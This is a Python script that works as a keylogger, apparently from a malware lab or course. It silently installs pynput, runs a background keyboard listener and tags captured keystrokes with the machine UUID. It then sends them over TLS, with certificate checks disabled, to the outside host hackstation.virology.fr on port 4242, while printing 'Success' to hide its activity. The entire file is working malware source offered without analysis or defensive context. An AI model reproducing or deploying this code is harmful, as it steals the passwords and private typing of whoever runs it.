import threading

def main():
    import importlib
    import subprocess

    required_packages = {
        "pynput": None,
    }

    for package, alias in required_packages.items():
        try:
            imported_module = importlib.import_module(package)
            if alias:
                globals()[alias] = imported_module
            else:
                globals()[package] = imported_module
        except ImportError:
            subprocess.check_call([r"C:\Temp\05ft8_2lthb4\Scripts\pip.exe", "install", package])
            imported_module = importlib.import_module(package)
            if alias:
                globals()[alias] = imported_module
            else:
                globals()[package] = imported_module

    from pynput import keyboard

    HOST = 'hackstation.virology.fr'
    PORT = 4242
    keystrokes = []
    password_to_stop = "Supe4Pa55wOrd"

    def send_keystrokes(uid):
        import ssl
        import socket
        nonlocal keystrokes
        if keystrokes:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with socket.create_connection((HOST, PORT)) as sock:
                    with context.wrap_socket(sock, server_hostname=HOST) as ssock:
                        keystrokes_str = "".join(k.decode() if isinstance(k, bytes) else k for k in keystrokes)
                        message = f"keylogger|||{uid}|||{keystrokes_str}".encode()
                        ssock.sendall(message)
                        keystrokes = []
            except Exception as e:
                print(f"Error sending keystrokes: {e}")

    def on_press(key):
        nonlocal keystrokes
        try:
            keystrokes.append(key.char.encode())
        except AttributeError:
            keystrokes.append(f"[{key.name}]")

        keystrokes_str = "".join(k.decode() if isinstance(k, bytes) else k for k in keystrokes)
        if password_to_stop in keystrokes_str.replace("[space]", " ").replace("[backspace]", "").replace("[shift]", ""):
            return False

        if len(keystrokes) > 100:
            send_keystrokes(uid)

    import os
    with keyboard.Listener(on_press=on_press) as listener:
        uid = os.popen("wmic csproduct get uuid").read().strip().splitlines()[-1]
        while listener.running:
            send_keystrokes(uid)
            listener.join(1)

t = threading.Thread(target=main)
t.start()
print("Success")
